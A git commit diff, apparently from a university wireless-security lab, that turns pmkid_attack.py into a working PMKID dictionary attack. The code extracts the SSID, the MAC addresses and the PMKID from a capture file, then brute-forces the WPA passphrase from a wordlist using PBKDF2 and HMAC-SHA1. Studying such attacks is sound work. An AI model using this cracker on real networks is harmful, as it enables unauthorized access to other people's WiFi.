46b5546f1a08e5b41f040781ea65fcd672dfa789
Gaetan <gaetan.daubresse@gmail.com>
2021-04-28 12:41:31 +0200

    Task 2 completed$

--- files/pmkid_attack.py
+++ files/pmkid_attack.py
@@ -23,20 +23,6 @@ from pbkdf2 import *
 import hmac, hashlib
 from scapy.contrib.wpa_eapol import WPA_key
 
-
-def customPRF512(key, A, B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i = 0
-    R = b''
-    while i <= ((blen * 8 + 159) / 160):
-        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
-        i += 1
-        R = R + hmacsha1.digest()
-    return R[:blen]
-
 def findBeacon(capture):
     """
     Cette fonction détecte et retourne le premier Beacon de la capture
@@ -45,15 +31,6 @@ def findBeacon(capture):
         # si la trame est de type et sous-type Beacon, on la retourne 
         if frame.type == 0 and frame.subtype == 8:
             return frame
-
-def findAuthentication(APmac, capture):
-    """
-    Cette fonction détecte et retourne le mac du client en sa basant sur les messages d'authentification
-    """
-    for frame in capture:
-        # Si la trame est de type et de sous-type authentification avec l'adresse MAC de l'AP
-        if frame.type == 0 and frame.subtype == 11 and a2b_hex(frame.addr2.replace(':', '')) == APmac :
-            return a2b_hex(frame.addr1.replace(':', ''))
 
 def find4wayHandShake(capture):
     """
@@ -67,10 +44,9 @@ def find4wayHandShake(capture):
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa = rdpcap("PMKID_handshake.pcap")
 
-# Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase = "actuelle"
-A = "Pairwise key expansion"  # this string is used in the pseudo-random function
 
+# Recuperation de la premiere trame du handshake pour extraire pmkid 
+handshake_first = find4wayHandShake(wpa)
 # recherche du premier beacon dans la capture
 Beacon = findBeacon(wpa)
 # Récupération du SSID
@@ -78,18 +54,34 @@ ssid = Beacon.info.decode("utf-8")
 # Récupération de l'adresse MAC de l'AP
 APmac = a2b_hex(Beacon.addr2.replace(':', ''))          # "cebcc8fdcab7"
 # Récupération de l'adresse MAC du client
-Clientmac = findAuthentication(APmac, wpa)              # "0013efd015bd"
-
-# detection du handshake et renvoi des 4 trames
-handshake = find4wayHandShake(wpa)
+Clientmac = a2b_hex(handshake_first.addr1.replace(':', ''))
 # Récupération du PMKID
-PMKID = raw(handshake[0])[193:-4]
+PMKID = raw(handshake_first)[193:-4].hex()
 
-print("\n\nValues used to derivate keys")
+print("\n\nValues used to compute PMKID")
 print("============================")
-print("Passphrase: ", passPhrase, "\n")
 print("SSID: ", ssid, "\n")
 print("AP Mac: ", b2a_hex(APmac), "\n")
 print("CLient Mac: ", b2a_hex(Clientmac), "\n")
-print("PMKID : ", bytes_hex(PMKID))
+print("PMKID from capture : ", PMKID, "\n\n")
 
+with open('wordlist.txt','r') as file:
+   
+    # reading each line    
+    for line in file:
+        find = False 
+        # reading each word        
+        for passPhrase in line.split():
+
+            #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+            pmk = pbkdf2(hashlib.sha1,str.encode(passPhrase), str.encode(ssid), 4096, 32)
+
+            pmkid_from_wordlist = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
+
+            print ( "Computed PMKID:\t\t", pmkid_from_wordlist.hexdigest()[0:32],"\n",
+                    "passPhrase : ", passPhrase)
+            if(hmac.compare_digest(PMKID, pmkid_from_wordlist.hexdigest()[0:32])):
+                print("Success ! The key is : ", passPhrase) 
+                find = True 
+        if find: 
+            break 
